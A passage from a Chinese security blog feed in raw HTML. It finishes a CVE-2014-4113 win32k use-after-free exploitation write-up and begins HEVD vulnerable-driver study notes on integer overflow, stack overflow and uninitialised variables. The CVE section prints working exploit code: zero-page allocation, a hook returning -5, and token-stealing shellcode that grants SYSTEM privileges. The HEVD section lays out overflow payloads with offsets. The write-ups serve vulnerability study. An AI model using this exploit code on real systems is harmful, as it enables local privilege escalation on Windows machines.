class="keyword">HWND</span> <span class="keyword">hWnd</span>, UINT Msg, <span class="keyword">WPARAM</span> <span class="keyword">wParam</span>, <span class="keyword">LPARAM</span> <span class="keyword">lParam</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"Callback two called.\n"</span>)<span class="comment">;</span></div><div class="line">EndMenu()<span class="comment">;</span></div><div class="line"><span class="keyword">return</span> <span class="number">-5</span><span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很显然,当菜单钩子函数返回值为-5的时候，<code>win32k!xxxMNFindWindowFromPoint</code>的返回值为<code>0xfffffffb</code>,由此造成UAF。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">95ab7b52 89460c         <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">0Ch</span>], <span class="built_in">eax</span></div><div class="line">95ab7b55 <span class="number">53</span>             <span class="keyword">push</span>    <span class="built_in">ebx</span></div><div class="line">95ab7b56 8d4510         <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">10h</span>]</div><div class="line">95ab7b59 <span class="number">50</span>             <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">95ab7b5a <span class="number">57</span>             <span class="keyword">push</span>    <span class="built_in">edi</span></div><div class="line">95ab7b5b e88596ffff     <span class="keyword">call</span>    win32k!xxxMNFindWindowFromPoint (95ab11e5)</div><div class="line">95ab7b60 8bd8           <span class="keyword">mov</span>     <span class="built_in">ebx</span>, <span class="built_in">eax</span></div><div class="line">kd&gt; g</div><div class="line">Breakpoint <span class="number">1</span> hit</div><div class="line">win32k!xxxHandleMenuMessages+<span class="number">0x9e</span>:</div><div class="line">95ab7b60 8bd8            <span class="keyword">mov</span>     <span class="built_in">ebx</span>,<span class="built_in">eax</span></div><div class="line">kd&gt; r <span class="built_in">eax</span></div><div class="line"><span class="built_in">eax</span>=fffffffb</div></pre></td></tr></table></figure></p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上一节介绍了，CVE-2014-4113最终是在<code>win32k!xxxSendMessageTimeout+0xb3</code>crash。我们再来分析一下，首先<code>int __stdcall xxxSendMessageTimeout(tagWND *pwnd, UINT message, WPARAM wParam, LPARAM lParam, UINT fuFlags, UINT uTimeout, PLONG_PTR lpdwResult)</code>的<code>*pwnd</code>是可控的，在CVE-2014-4113这个漏洞中，该值为0xFFFFFFFB.当执行流执行到0x95A44856的时候，此时esi为0xFFFFFFFB，则<code>[esi+60] = [0xFFFFFFFB + 0x60] = 0x5B</code>即会调用地址为0x5B这个地址的函数。<br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">nt!RtlpBreakWithStatusInstruction:</div><div class="line"><span class="number">83e6</span>d394 cc              int     <span class="number">3</span></div><div class="line">kd&gt; G</div><div class="line">Access violation - code c0000005 (!!! second chance !!!)</div><div class="line">win32k!xxxSendMessageTimeout+<span class="number">0</span>xb3:</div><div class="line"><span class="number">94</span>a54760 <span class="number">3</span>b7e08          cmp     edi,dword ptr [esi+<span class="number">8</span>]</div></pre></td></tr></table></figure></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">.text:</span>95A446C1 loc_95A446C1:                           <span class="comment">; CODE XREF: xxxSendMessageTimeout(x,x,x,x,x,x,x,x)+F↑j</span></div><div class="line"><span class="symbol">.text:</span>95A446C1                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+pwnd] <span class="comment">; CVE-2014-4113 esi = 0xFFFFFFFB</span></div><div class="line"><span class="symbol">.text:</span>95A446C4                 <span class="keyword">cmp</span>     <span class="built_in">esi</span>, <span class="number">0FFFFFFFFh</span></div><div class="line"><span class="symbol">.text:</span>95A446C7                 <span class="keyword">jnz</span>     short loc_95A44700</div><div class="line">[...]</div><div class="line"><span class="symbol">.text:</span>95A4484E loc_95A4484E:                           <span class="comment">; CODE XREF: xxxSendMessageTimeout(x,x,x,x,x,x,x,x)+198↑j</span></div><div class="line"><span class="symbol">.text:</span>95A4484E                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+lParam]</div><div class="line"><span class="symbol">.text:</span>95A44851                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+wParam]</div><div class="line"><span class="symbol">.text:</span>95A44854                 <span class="keyword">push</span>    <span class="built_in">ebx</span></div><div class="line"><span class="symbol">.text:</span>95A44855                 <span class="keyword">push</span>    <span class="built_in">esi</span></div><div class="line"><span class="symbol">.text:</span>95A44856                 <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">60h</span>] <span class="comment">; [esi+60] = [0xFFFFFFFB + 0x60] = 0x5B</span></div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上述分析，要想执行流执行到0x95A44856，需要满足两个条件，内存地址为3的地址存放的是当前线程信息。gptiCurrent是一个全局变量，其指向的是tagTHREADINFO结构，也就是线程环境块偏移0x40的Win32ThreadInfo结构。<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">.<span class="string">text:</span><span class="number">95</span>A4475A                 mov     edi, _gptiCurrent</div><div class="line">.<span class="string">text:</span><span class="number">95</span>A44760                 cmp     edi, [esi+<span class="number">8</span>]    ; [esi+<span class="number">8</span>] = [<span class="number">0xFFFFFFFB</span> +<span class="number">8</span> ] = <span class="number">0x3</span></div><div class="line">.<span class="string">text:</span><span class="number">95</span>A44763                 jz      loc_95A447ED</div><div class="line">.<span class="string">text:</span><span class="number">95</span>A44769                 mov     ecx, [esi]</div><div class="line">.<span class="string">text:</span><span class="number">95</span>A4476B                 mov     edx, dword_95B9C0E4</div><div class="line">kd&gt; dt _teb</div><div class="line">nt!_TEB</div><div class="line">+<span class="number">0x000</span> <span class="string">NtTib :</span> _NT_TIB</div><div class="line">+<span class="number">0x01c</span> <span class="string">EnvironmentPointer :</span> Ptr32 Void</div><div class="line">+<span class="number">0x020</span> <span class="string">ClientId :</span> _CLIENT_ID ：当前进程ID</div><div class="line">+<span class="number">0x028</span> <span class="string">ActiveRpcHandle :</span> Ptr32 Void</div><div class="line">+<span class="number">0x02c</span> <span class="string">ThreadLocalStoragePointer :</span> Ptr32 Void</div><div class="line">+<span class="number">0x030</span> <span class="string">ProcessEnvironmentBlock :</span> Ptr32 _PEB 当前进程的PEB指针</div><div class="line">+<span class="number">0x034</span> <span class="string">LastErrorValue :</span> Uint4B</div><div class="line">+<span class="number">0x038</span> <span class="string">CountOfOwnedCriticalSections :</span> Uint4B</div><div class="line">+<span class="number">0x03c</span> <span class="string">CsrClientThread :</span> Ptr32 Void</div><div class="line">+<span class="number">0x040</span> <span class="string">Win32ThreadInfo :</span> Ptr32 Void</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二，地址为4的内存的值为4<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">.text:</span>95A44826 loc_95A44826:                           <span class="comment">; CODE XREF: xxxSendMessageTimeout(x,x,x,x,x,x,x,x)+151↑j</span></div><div class="line"><span class="symbol">.text:</span>95A44826                 <span class="keyword">test</span>    <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">16h</span>], <span class="number">4</span> <span class="comment">; [esi+8] = [0xFFFFFFFB +16] = 0x11</span></div><div class="line"><span class="symbol">.text:</span>95A4482A                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+HighLimit]</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上述描述，最终通过<code>call    dword ptr [esi+60h]</code>执行shellcode，所以我们需要在<code>0x5B</code>处提前设置Shllcode的地址。在《Windows核心编程》关于内存结构的章节中指出：Windows系统存在空指针赋值分区，其范围从0x00000000至0x0000FFFF，由于这部分内存位于地址空间的最开始，因此也称之为零页内存。可以通过<code>NtAllocateVirtualMemory</code>分配内存空间，对于Windows系统，在进程的虚拟空间申请一块内存时，该块内存默认为64KB大小对齐（分配内存的起始地址必须为64KB的整数倍），因此，当我们设置分配内存的起始地址为0x00000100时，系统会强制决定起始地址为0x00000000，由于我们分配页面大小选择4KB，因此分配得到的内存空间为0x00000000~0x00001FFF。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">BOOL AllocateZeroPage()</div><div class="line">&#123;</div><div class="line">pfnNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA(<span class="string">"ntdll.dll"</span>),</div><div class="line"><span class="string">"NtAllocateVirtualMemory"</span>);</div><div class="line">if (NULL == NtAllocateVirtualMemory)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!] Get NtAllocateVirtualMemory Error<span class="subst">\n</span>"</span>);</div><div class="line">return <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">printf(<span class="string">"[*] NtAllocateVirtualMemory Address is :0x%p <span class="subst">\n</span>"</span>, NtAllocateVirtualMemory);</div><div class="line"><span class="comment">//https://www.anquanke.com/post/id/241057</span></div><div class="line">NTSTATUS ntStatus = <span class="number">0</span>;</div><div class="line">PVOID BaseAddress = (PVOID)<span class="number">0x100</span>;   <span class="comment">//虽然将baseaddr设置为0x100，系统会强制将起始地址设置为0x00000000</span></div><div class="line">SIZE_T RegionSize = <span class="number">0x1000</span>;</div><div class="line">ntStatus = NtAllocateVirtualMemory((HANDLE)<span class="number">0xFFFFFFFF</span>,</div><div class="line">&amp;BaseAddress,</div><div class="line"><span class="number">0</span>,</div><div class="line">&amp;RegionSize,</div><div class="line">MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,</div><div class="line">PAGE_EXECUTE_READWRITE);</div><div class="line">if (ntStatus != <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!]Execuate NtAllocateVirtualMemory Error<span class="subst">\n</span>"</span>);</div><div class="line">return <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">//getchar();</span></div><div class="line">return <span class="literal">TRUE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了能执行到漏洞利用处，需要满足上面两个条件,并设置shellcode地址。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">*(<span class="name">DWORD*</span>)(<span class="number">0</span>x03) = (<span class="name">DWORD</span>)GetPtiCurrent()<span class="comment">;</span></div><div class="line">*(<span class="name">DWORD*</span>)(<span class="number">0</span>x11) = (<span class="name">DWORD</span>)<span class="number">4</span><span class="comment">;</span></div><div class="line">*(<span class="name">DWORD*</span>)(<span class="number">0</span>x5B) = (<span class="name">DWORD</span>)&amp;ShellCode<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造Shellcode函数值得注意的是，首先Shellcode函数的函数原型必须和<code>result = pwnd-&gt;lpfnWndProc(pwnd, message_1, wParam, lParam);</code>保持一致。而且尽量让编译器进行堆栈的平衡。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span>  __stdcall ShellCode(<span class="keyword">int</span> parameter1, <span class="keyword">int</span> parameter2, <span class="keyword">int</span> parameter3, <span class="keyword">int</span> parameter4)</div><div class="line">&#123;</div><div class="line">_asm</div><div class="line">&#123;</div><div class="line"><span class="keyword">pushad</span></div><div class="line"><span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="built_in">fs</span>:[<span class="built_in">eax</span> + KTHREAD_OFFSET]</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span> + EPROCESS_OFFSET]</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">eax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">edx</span>, SYSTEM_PID<span class="comment">;</span></div><div class="line"><span class="symbol">SearchSystemPID:</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span> + FLINK_OFFSET]</div><div class="line"><span class="keyword">sub</span> <span class="built_in">eax</span>, FLINK_OFFSET</div><div class="line"><span class="keyword">cmp</span>[<span class="built_in">eax</span> + PID_OFFSET], <span class="built_in">edx</span><span class="comment">;</span></div><div class="line"><span class="keyword">jne</span> SearchSystemPID</div><div class="line"><span class="keyword">mov</span> <span class="built_in">edx</span>, [<span class="built_in">eax</span> + TOKEN_OFFSET]</div><div class="line"><span class="keyword">mov</span>[<span class="built_in">ecx</span> + TOKEN_OFFSET], <span class="built_in">edx</span></div><div class="line"><span class="keyword">popad</span></div><div class="line">&#125;</div><div class="line">return <span class="number">0</span><span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="0x04-参考文献"><a href="#0x04-参考文献" class="headerlink" title="0x04 参考文献"></a>0x04 参考文献</h2><ul><li>[1] <a href="https://b2ahex.github.io/blog/2017/06/13/4113分析/index.html" target="_blank" rel="external">CVE-2014-4113 漏洞利用分析</a> : 主要的poc构建框架</li><li>[2] <a href="https://github.com/B2AHEX/cveXXXX/blob/master/CVE-2014-4113/exploit.cpp" target="_blank" rel="external">https://github.com/B2AHEX/cveXXXX/blob/master/CVE-2014-4113/exploit.cpp</a> : CVE-2014-4113的exp</li><li>[3] <a href="https://bbs.pediy.com/thread-271809.htm" target="_blank" rel="external">CVE-2014-4113提权漏洞学习笔记</a> : 详细的分析笔记</li><li>[4] <a href="https://www.anquanke.com/post/id/84869" target="_blank" rel="external">[技术分享]经典内核漏洞调试笔记</a></li><li>以及小刀师傅的详细解答</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CVE-2014-4113是Win32k下的释放后重引用漏洞(UAF)，该漏洞位于&lt;code&gt;win32k!xxxHandleMenuMessages&lt;/code&gt;中，通过调用&lt;code&gt;win32k!xxxMNFindWindowFromPoint&lt;/code&gt;获取tagWnd指针，在此期间，执行流通过回调机制，返回用户侧，在用户侧释放目标菜单对象，并返回&lt;code&gt;0xFFFFFFFB&lt;/code&gt;。当执行流重新返回内核侧，&lt;br&gt;并没有针对返回值进行校验，直接使用该返回值作为参数传入&lt;code&gt;win32k!xxxSendMessage&lt;/code&gt;发送&lt;code&gt;MN_BUTTONDOWN&lt;/code&gt;消息，由此造成UAF。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://findream.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
  </entry>
  
  <entry>
    <title>HEVD学习</title>
    <link href="https://findream.github.io/2022/07/05/HEVD%E5%AD%A6%E4%B9%A0/"/>
    <id>https://findream.github.io/2022/07/05/HEVD学习/</id>
    <published>2022-07-05T07:02:11.000Z</published>
    <updated>2022-11-12T07:08:32.818Z</updated>
    
    <content type="html"><![CDATA[<ul><li>HEVD简单学习<a id="more"></a></li></ul><h1 id="0x1-整数溢出"><a href="#0x1-整数溢出" class="headerlink" title="0x1 整数溢出"></a>0x1 整数溢出</h1><h2 id="0x1-1-成因分析"><a href="#0x1-1-成因分析" class="headerlink" title="0x1.1 成因分析"></a>0x1.1 成因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;整数包括无符号整数和有符号整数，但是对于计算机来说，区分无符号整数和有符号整数意义不大，比如”-1”,无符号整数来说，其值为<code>4294967295</code>,也就是<code>0xFFFFFFFF</code>,编译器根据数据类型的不同，生成不同的代码，规定了每个数据变量的长度。在自然语义环境中，如果是4294967295加上4，最终会得到4294967299这个数字，但是，在计算机语义中，这个是在这个数据类型中是最大的，加上4就需要向高位拓展。这样就会丢弃拓展的高位。整数溢出就是这样产生的。例如,<code>0xFFFFFFFF</code>加上<code>4</code>之后，得到的数据就是<code>3</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>整数溢出漏洞的作用是什么，整数溢出主要是为了绕过可能的长度检查。</strong>如下的例子，如果输入任意正整数，都不可能使得b+c 小于 a，但是如果输入的c是0xFFFFFFF0，因为整数溢出，0xFFFFFFFA+0x9 = 0x3.如此就绕过了长度检查。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> a = <span class="number">8</span>;</div><div class="line"><span class="keyword">int</span> b = <span class="number">9</span>;</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;c);</div><div class="line"><span class="keyword">if</span>(b+c &lt; <span class="number">8</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"success"</span>)</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"failed"</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HEVD的IntegerOverflow位于TriggerIntegerOverflow函数中，直接通过反汇编看，已知函数栈空间为0x820+0x04=0x824,也就是说要实现栈溢出需要0x824+0x04的大小实现。但是在代码中，对缓冲区长度进行了校验，根据自然语义下理解，缓冲区长度加上4要小于0x800，说明缓冲区不可能超过0x800，这样就不会造成栈溢出。<br>    <img src="http://hacky.wang/blog/20220722/hx8xVjwNx9xf.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是由于整数溢出，当我传入的UserBufferLength为0xFFFFFFFF，加个4，得0x3，这样自然就绕过了大小的限制。</p><h2 id="0x1-2-漏洞利用"><a href="#0x1-2-漏洞利用" class="headerlink" title="0x1.2 漏洞利用"></a>0x1.2 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据分析代码，明确使用栈溢出进行利用，使用整数溢出绕过长度检查。查看代码，要使进行缓冲区复制需要两个条件，Buffer内容不为0xBAD0B0B0，长度小于UserBufferLength/4。在使用整数溢出的是和，第二个条件得到满足，但是前面也说了实现栈溢出需要0x824+0x04的大小的缓冲区，所以，构造的payload主要构成是这样的，0x824长度用于填充缓冲，0x04是提权shellcode的地址，最后四个字节内容为0xBAD0B0B0，用于终止缓冲区复制。<br>    <img src="http://hacky.wang/blog/20220722/V9QyljolQXJA.png?imageslim" alt="mark"></p><h1 id="0x2-栈溢出"><a href="#0x2-栈溢出" class="headerlink" title="0x2 栈溢出"></a>0x2 栈溢出</h1><h2 id="0x2-1-环境安装与HEVD说明"><a href="#0x2-1-环境安装与HEVD说明" class="headerlink" title="0x2.1 环境安装与HEVD说明"></a>0x2.1 环境安装与HEVD说明</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;安装完VirtualKd和Windbg Preview之后，配置WindbgPreview，首先在启动虚拟机之前，配置Costumer如下：<code>DbgX.Shell.exe /k com:pipe,resets=0,reconnect,port=$(pipename)</code>。然后启动虚拟机可能也运行不起WindbgPreview，如果出现这种情况，先设置<code>WinDbg.exe</code>的路径，然后运行调试器，等Windbg起来后，在勾选到<code>Costumer</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HEVD有编译好的SYS文件以及源码，其中编译好的SYS有两个文件夹，<code>secure</code>是已经修复过的SYS，而<code>vulnerable</code>是指存在漏洞的SYS。源码是修复之后的代码。<br>    <img src="http://hacky.wang/blog/20220720/88pOuaHsceok.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;含有漏洞代码主要位于<code>HackSysExtremeVulnerableDriver</code>中的<code>IrpDeviceIoCtlHandler</code>函数中，这个函数包含了HEVD所有的漏洞类型。<br>    <img src="http://hacky.wang/blog/20220720/ABYOW7EY0EiO.png?imageslim" alt="mark"></p><h2 id="0x2-2-成因分析"><a href="#0x2-2-成因分析" class="headerlink" title="0x2.2 成因分析"></a>0x2.2 成因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;栈溢出位于HEVD控制码为0x222003的函数处，也就是<code>sub_44517E</code>,很显然，在<code>sub_44517E</code>函数中，将有R3传入的缓冲区，以及该缓冲区的大小传入函数<code>sub_4451A2</code>,在<code>sub_4451A2</code>函数中，并没有对传入的缓冲区大小进行校验，即判断两个缓冲区大小。导致我们传入大于KernelBuffer的大小的UserBuffer，导致栈溢出。<br>    <img src="http://hacky.wang/blog/20220720/4nSgKhHGpCmm.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220720/LSCnVV4FxHK7.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据IDA的解析结果来看，var_1c占了1C大小的空间，KernelBuffer占据了1C-81C共计800h大小的空间，这样子一共占用了81Ch大小的空间，加上返回地址4h的空间，一共占了820h的空间，所以我们构造栈溢出的话，只需要构造820h+4h的空间即可。<br>    <img src="http://hacky.wang/blog/20220720/LeGxgvP8T0ok.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从源码来看，存在漏洞的版本，直接按照UserBuffer大小将UserBuffer复制给KernelBuffer，而修复之后的版本，是按照KernelBuffer大小将UserBuffer复制给KernelBuffer，由此修复了漏洞。<br>    <img src="http://hacky.wang/blog/20220720/ABM8Dt0a3dkC.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>HEVD！TriggerBufferOverflowStack</code>处下断，以及在Buffer复制的地方下断，首先断在<code>HEVD！TriggerBufferOverflowStack</code>开头，查看栈顶寄存器为0x98075bd4，当运行到memcpy处，查看目的地址，也就是第一个参数地址为0x980753b4，两者相减，大小为0x00000820。也就是说，只需要构造一个大小为0x820+0x04的缓冲区，其中前0x820用于覆盖KernelBuffer，最后4个字节用于栈溢出，只需要将提取的shellcode地址放到最后四个字节处就可以实现漏洞利用。<br>    <img src="http://hacky.wang/blog/20220720/oFYFtM7SlLfQ.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220720/3CHfIoNcpwCb.png?imageslim" alt="mark"></p><h2 id="0x2-3-漏洞利用"><a href="#0x2-3-漏洞利用" class="headerlink" title="0x2.3 漏洞利用"></a>0x2.3 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，需要打开驱动设备，在没有源码的情况下，在<code>DriverEntry</code>函数中，创建了一个名为<code>\\Device\\HackSysExtremeVulnerableDriver</code>的Device，所以在R3也应该创建<code>\\\\.\\HackSysExtremeVulnerableDriver</code>的Device。<br>    <img src="http://hacky.wang/blog/20220720/m7vPrx9mIecR.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着，如上所说，应该构造符合条件的Shellcode。具体就是构造一个大小为0x820+0x04的缓冲区，其中前0x820用于覆盖KernelBuffer，最后4个字节用于栈溢出，只需要将提取的shellcode地址放到最后四个字节处就可以实现漏洞利用。<br>    <img src="http://hacky.wang/blog/20220720/OjgBcmXNrzLB.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后将payload通过<code>DeviceIoControl</code>传入，Shellcode的原理是通过FS+0x124，获取线程的KTHREAD,然后在通过KTHREAD+0x50获取进程的EPROCESS，然后将当前进程的EPROCESS地址保存在ECX寄存器中。因为EPROCESS是一个链装结构，通过<code>mov eax, [eax + FLINK_OFFSET]</code>这个语句可以定位到下一个EPROCESS链，然后减去0xB8即可定位到EPROCESS结构头。在EPROCESS偏移+0xB4处获取PID，然后和system进程的PID(4)相比，以确定system进程。然后通过0xF8获取system进程token，并将system进程token保存。然后调整栈就可以了。<br>    <img src="http://hacky.wang/blog/20220720/PIoN4NqXKGQ9.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220720/qjPxVHC365cM.png?imageslim" alt="mark"></p><h2 id="0x2-4-参考"><a href="#0x2-4-参考" class="headerlink" title="0x2.4 参考"></a>0x2.4 参考</h2><ul><li><a href="https://bbs.pediy.com/thread-270172.htm" target="_blank" rel="external">HEVD学习笔记之缓冲区溢出攻击</a></li><li><a href="https://bbs.pediy.com/thread-252484.htm" target="_blank" rel="external">Windows Kernel Exploit 内核漏洞学习(2)-内核栈溢出</a></li></ul><h1 id="0x3-未初始化栈变量"><a href="#0x3-未初始化栈变量" class="headerlink" title="0x3 未初始化栈变量"></a>0x3 未初始化栈变量</h1><h2 id="0x3-1-成因分析"><a href="#0x3-1-成因分析" class="headerlink" title="0x3.1 成因分析"></a>0x3.1 成因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;变量创建之后，如果没有及时进行初始化赋值操作，当再次使用该变量的时候，容易产生出乎意料的运行结果。所以我们在编码过程中，一定不要忘记对变量进行初始化。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如下代码,函数指针及时进行了初始化赋值<code>pFunc = test;</code>,在后续调用该指针指向的函数时<code>(*pFunc)();</code>，产生了正确的结果<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"test\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">void</span> (*pFunc)();</div><div class="line">    pFunc = test;</div><div class="line">    (*pFunc)();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div 